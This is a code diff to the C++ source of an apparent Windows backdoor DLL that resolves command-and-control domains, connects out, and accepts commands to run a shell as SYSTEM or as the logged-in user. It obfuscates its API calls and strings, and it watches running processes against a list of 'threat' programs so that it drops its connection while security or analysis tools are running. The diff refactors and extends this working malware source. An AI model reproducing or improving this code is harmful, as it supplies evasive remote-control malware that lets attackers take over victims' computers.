@@ -22,10 +22,9 @@ bool is_there_a_threat() {
         do {
             std::string name = std::string(reinterpret_cast<char*>(pe32.szExeFile));
             std::transform(name.begin(), name.end(), name.begin(), ::tolower); // to lower
-            for (const char* process_name : THREAT_PROCESSES) {
-                if (strcmp(name.c_str(), process_name) == 0) {
+            for (const std::string& process_name : THREAT_PROCESSES) {
+                if (name == process_name) {
                     return true;
-                    break;
                 }
             }
         } while (process32_next(hSnapshot, &pe32));
@@ -35,41 +34,44 @@ bool is_there_a_threat() {
 
 
 DWORD close_client_on_threats(LPVOID client_pointer) {
-    auto& client = *reinterpret_cast<TCPClient*>(client_pointer);
-    while (client.m_is_connected) {
+    const auto client = reinterpret_cast<TCPClient*>(client_pointer);
+    while (client->m_is_connected) {
         if (is_there_a_threat()) {
-            client.disconnect();
+            client->disconnect();
+            return 0;
         }
     }
     return 0;
 }
 
 
-void get_command(TCPClient& client) {
+void get_command(TCPClient* client) {
     create_thread_type create_thread = WINAPI_OBFUSCATE(create_thread_type, "CreateThread", "kernel32");
-    create_thread(nullptr, 0, close_client_on_threats, &client, 0, 0);
     get_module_handle_type get_module_handle = WINAPI_OBFUSCATE(get_module_handle_type, "GetModuleHandleW", "kernel32");
     free_library_and_exit_thread_type free_library_and_exit_thread = WINAPI_OBFUSCATE(free_library_and_exit_thread_type, "FreeLibraryAndExitThread", "kernel32");
-    client.reconnect();
-    auto data = client.receive(4);
+    client->reconnect();
+    create_thread(nullptr, 0, close_client_on_threats, client, 0, 0);
+    const auto data = client->receive(4);
     switch ((*data)[0]) {
     case 0: // ping
-        handle_ping_command(client);
+        handle_ping_command(*client);
         break;
     case 1: // Execute shell as SYSTEM
-        handle_shell_command(client);
+        handle_shell_command(*client);
         break;
     case 2: // Execute as user
-        handle_shell_command_as_user(client);
+        handle_shell_command_as_user(*client);
         break;
     case 3: // Exit
         free_library_and_exit_thread(get_module_handle(nullptr), 0);
+        break;
+    case 4:
     default:
-        client.send_data(OBFUSCATE("Unknown command"));
+        client->send_data(OBFUSCATE("Unknown command"));
         break;
     }
 
-    client.disconnect();
+    client->disconnect();
 }
 
 DWORD dll_main(LPVOID param) {
@@ -83,8 +85,8 @@ DWORD dll_main(LPVOID param) {
     }
     std::string cnc_ip = "";
     while (cnc_ip == "") {
-        for (const char* domain : CNC_DOMAINS) {
-            cnc_ip = domain_to_ip(domain);
+        for (const std::string& domain : CNC_DOMAINS) {
+            cnc_ip = domain_to_ip(domain.c_str());
             if (cnc_ip != "") {
                 break;
             }
@@ -95,7 +97,7 @@ DWORD dll_main(LPVOID param) {
     // Command handler:
     while (1) {
         if (!is_there_a_threat()) {
-            get_command(client);
+            get_command(&client);
         }
         sleep(1000 * SLEEP_BETWEEN_COMMANDS);
     }
